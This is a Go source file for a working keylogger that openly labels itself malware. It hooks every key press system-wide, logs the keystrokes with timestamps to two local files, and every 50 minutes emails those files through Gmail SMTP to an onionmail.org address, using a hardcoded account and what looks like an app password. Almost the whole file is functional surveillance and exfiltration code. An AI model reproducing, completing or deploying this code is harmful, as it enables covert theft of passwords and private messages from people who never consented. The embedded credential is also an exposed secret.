package main

import (
	"fmt"
	"os"
	"time"

	hook "github.com/robotn/gohook"
	"gopkg.in/gomail.v2"
)

func sendemail() {

	for {
		time.Sleep(50 * time.Minute) //Pls change this if wanna change the time to send an email
		mail := gomail.NewMessage()

		mail.SetHeader("From", "anonymous.sender.malware@gmail.com")
		mail.SetHeader("To", "john.nollan12345@onionmail.org")
		mail.SetHeader("Subject", time.Now().Format("15:04"))

		mail.Attach("simple.txt")
		mail.Attach("log.txt")

		d := gomail.NewDialer("smtp.gmail.com", 587, "anonymous.sender.malware@gmail.com", "gncp guxp oqnh lwjn")

		d.DialAndSend(mail)

	}
}

func main() {

	go sendemail()

	var keycode string
	var charKey string

	var file, _ = os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	var simplefile, _ = os.OpenFile("simple.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	defer simplefile.Close()
	defer file.Close()

	hook.Register(hook.KeyDown, []string{}, func(e hook.Event) {

		keycode = fmt.Sprintf("%d", e.Keychar)

		switch keycode {
		case "0":
			charKey = "NUL (Null character)"
		case "1":
			charKey = "SOH (Start of Heading)"
		case "2":
			charKey = "STX (Start of Text)"
		case "3":
			charKey = "ETX (End of Text)"
		case "4":
			charKey = "EOT (End of Transmission)"
		case "5":
			charKey = "ENQ (Enquiry)"
		case "6":
			charKey = "ACK (Acknowledge)"
		case "7":
			charKey = "BEL (Bell)"
		case "8":
			charKey = "BS (Backspace)"
		case "9":
			charKey = "TAB (Tab)"
		case "10":
			charKey = "LF (Line Feed)"
		case "11":
			charKey = "VT (Vertical Tab)"
		case "12":
			charKey = "FF (Form Feed)"
		case "13":
			charKey = "CR (Carriage Return)"
		case "14":
			charKey = "SO (Shift Out)"
		case "15":
			charKey = "SI (Shift In)"
		case "16":
			charKey = "DLE (Data Link Escape)"
		case "17":
			charKey = "DC1 (Device Control 1)"
		case "18":
			charKey = "DC2 (Device Control 2)"
		case "19":
			charKey = "DC3 (Device Control 3)"
		case "20":
			charKey = "DC4 (Device Control 4)"
		case "21":
			charKey = "NAK (Negative Acknowledge)"
		case "22":
			charKey = "SYN (Synchronous Idle)"
		case "23":
			charKey = "ETB (End of Block)"
		case "24":
			charKey = "CAN (Cancel)"
		case "25":
			charKey = "EM (End of Medium)"
		case "26":
			charKey = "SUB (Substitute)"
		case "27":
			charKey = "ESC (Escape)"
		case "28":
			charKey = "FS (File Separator)"
		case "29":
			charKey = "GS (Group Separator)"
		case "30":
			charKey = "RS (Record Separator)"
		case "31":
			charKey = "US (Unit Separator)"
		case "32":
			charKey = "SPACE"
		case "33":
			charKey = "!"
		case "34":
			charKey = "\""
		case "35":
			charKey = "#"
		case "36":
			charKey = "$"
		case "37":
			charKey = "%"
		case "38":
			charKey = "&"
		case "39":
			charKey = "'"
		case "40":
			charKey = "("
		case "41":
			charKey = ")"
		case "42":
			charKey = "*"
		case "43":
			charKey = "+"
		case "44":
			charKey = ","
		case "45":
			charKey = "-"
		case "46":
			charKey = "."
		case "47":
			charKey = "/"
		case "48":
			charKey = "0"
		case "49":
			charKey = "1"
		case "50":
			charKey = "2"
		case "51":
			charKey = "3"
		case "52":
			charKey = "4"
		case "53":
			charKey = "5"
		case "54":
			charKey = "6"
		case "55":
			charKey = "7"
		case "56":
			charKey = "8"
		case "57":
			charKey = "9"
		case "58":
			charKey = ":"
		case "59":
			charKey = ";"
		case "60":
			charKey = "<"
		case "61":
			charKey = "="
		case "62":
			charKey = ">"
		case "63":
			charKey = "?"
		case "64":
			charKey = "@"
		case "65":
			charKey = "A"
		case "66":
			charKey = "B"
		case "67":
			charKey = "C"
		case "68":
			charKey = "D"
		case "69":
			charKey = "E"
		case "70":
			charKey = "F"
		case "71":
			charKey = "G"
		case "72":
			charKey = "H"
		case "73":
			charKey = "I"
		case "74":
			charKey = "J"
		case "75":
			charKey = "K"
		case "76":
			charKey = "L"
		case "77":
			charKey = "M"
		case "78":
			charKey = "N"
		case "79":
			charKey = "O"
		case "80":
			charKey = "P"
		case "81":
			charKey = "Q"
		case "82":
			charKey = "R"
		case "83":
			charKey = "S"
		case "84":
			charKey = "T"
		case "85":
			charKey = "U"
		case "86":
			charKey = "V"
		case "87":
			charKey = "W"
		case "88":
			charKey = "X"
		case "89":
			charKey = "Y"
		case "90":
			charKey = "Z"
		case "91":
			charKey = "["
		case "92":
			charKey = "\\"
		case "93":
			charKey = "]"
		case "94":
			charKey = "^"
		case "95":
			charKey = "_"
		case "96":
			charKey = "`"
		case "97":
			charKey = "a"
		case "98":
			charKey = "b"
		case "99":
			charKey = "c"
		case "100":
			charKey = "d"
		case "101":
			charKey = "e"
		case "102":
			charKey = "f"
		case "103":
			charKey = "g"
		case "104":
			charKey = "h"
		case "105":
			charKey = "i"
		case "106":
			charKey = "j"
		case "107":
			charKey = "k"
		case "108":
			charKey = "l"
		case "109":
			charKey = "m"
		case "110":
			charKey = "n"
		case "111":
			charKey = "o"
		case "112":
			charKey = "p"
		case "113":
			charKey = "q"
		case "114":
			charKey = "r"
		case "115":
			charKey = "s"
		case "116":
			charKey = "t"
		case "117":
			charKey = "u"
		case "118":
			charKey = "v"
		case "119":
			charKey = "w"
		case "120":
			charKey = "x"
		case "121":
			charKey = "y"
		case "122":
			charKey = "z"
		case "123":
			charKey = "{"
		case "124":
			charKey = "|"
		case "125":
			charKey = "}"
		case "126":
			charKey = "~"
		default:
			charKey = "Caractere desconhecido ou de controle"
		}

		var onlychar string
		switch keycode {
		case "32":
			onlychar = " "
		case "33":
			onlychar = "!"
		case "34":
			onlychar = "\""
		case "35":
			onlychar = "#"
		case "36":
			onlychar = "$"
		case "37":
			onlychar = "%"
		case "38":
			onlychar = "&"
		case "39":
			onlychar = "'"
		case "40":
			onlychar = "("
		case "41":
			onlychar = ")"
		case "42":
			onlychar = "*"
		case "43":
			onlychar = "+"
		case "44":
			onlychar = ","
		case "45":
			onlychar = "-"
		case "46":
			onlychar = "."
		case "47":
			onlychar = "/"
		case "48":
			onlychar = "0"
		case "49":
			onlychar = "1"
		case "50":
			onlychar = "2"
		case "51":
			onlychar = "3"
		case "52":
			onlychar = "4"
		case "53":
			onlychar = "5"
		case "54":
			onlychar = "6"
		case "55":
			onlychar = "7"
		case "56":
			onlychar = "8"
		case "57":
			onlychar = "9"
		case "58":
			onlychar = ":"
		case "59":
			onlychar = ";"
		case "60":
			onlychar = "<"
		case "61":
			onlychar = "="
		case "62":
			onlychar = ">"
		case "63":
			onlychar = "?"
		case "64":
			onlychar = "@"
		case "65":
			onlychar = "A"
		case "66":
			onlychar = "B"
		case "67":
			onlychar = "C"
		case "68":
			onlychar = "D"
		case "69":
			onlychar = "E"
		case "70":
			onlychar = "F"
		case "71":
			onlychar = "G"
		case "72":
			onlychar = "H"
		case "73":
			onlychar = "I"
		case "74":
			onlychar = "J"
		case "75":
			onlychar = "K"
		case "76":
			onlychar = "L"
		case "77":
			onlychar = "M"
		case "78":
			onlychar = "N"
		case "79":
			onlychar = "O"
		case "80":
			onlychar = "P"
		case "81":
			onlychar = "Q"
		case "82":
			onlychar = "R"
		case "83":
			onlychar = "S"
		case "84":
			onlychar = "T"
		case "85":
			onlychar = "U"
		case "86":
			onlychar = "V"
		case "87":
			onlychar = "W"
		case "88":
			onlychar = "X"
		case "89":
			onlychar = "Y"
		case "90":
			onlychar = "Z"
		case "91":
			onlychar = "["
		case "92":
			onlychar = "\\"
		case "93":
			onlychar = "]"
		case "94":
			onlychar = "^"
		case "95":
			onlychar = "_"
		case "96":
			onlychar = "`"
		case "97":
			onlychar = "a"
		case "98":
			onlychar = "b"
		case "99":
			onlychar = "c"
		case "100":
			onlychar = "d"
		case "101":
			onlychar = "e"
		case "102":
			onlychar = "f"
		case "103":
			onlychar = "g"
		case "104":
			onlychar = "h"
		case "105":
			onlychar = "i"
		case "106":
			onlychar = "j"
		case "107":
			onlychar = "k"
		case "108":
			onlychar = "l"
		case "109":
			onlychar = "m"
		case "110":
			onlychar = "n"
		case "111":
			onlychar = "o"
		case "112":
			onlychar = "p"
		case "113":
			onlychar = "q"
		case "114":
			onlychar = "r"
		case "115":
			onlychar = "s"
		case "116":
			onlychar = "t"
		case "117":
			onlychar = "u"
		case "118":
			onlychar = "v"
		case "119":
			onlychar = "w"
		case "120":
			onlychar = "x"
		case "121":
			onlychar = "y"
		case "122":
			onlychar = "z"
		case "123":
			onlychar = "{"
		case "124":
			onlychar = "|"
		case "125":
			onlychar = "}"
		case "126":
			onlychar = "~"
		default:
			onlychar = ""
		}

		var finalmessage = fmt.Sprintf("%s|%s\n", time.Now().Format("15:04:05"), charKey)

		//file, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		//simplefile, _ := os.OpenFile("simple.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

		file.WriteString(finalmessage)
		simplefile.WriteString(onlychar)

	})
	s := hook.Start()
	<-hook.Process(s)

}
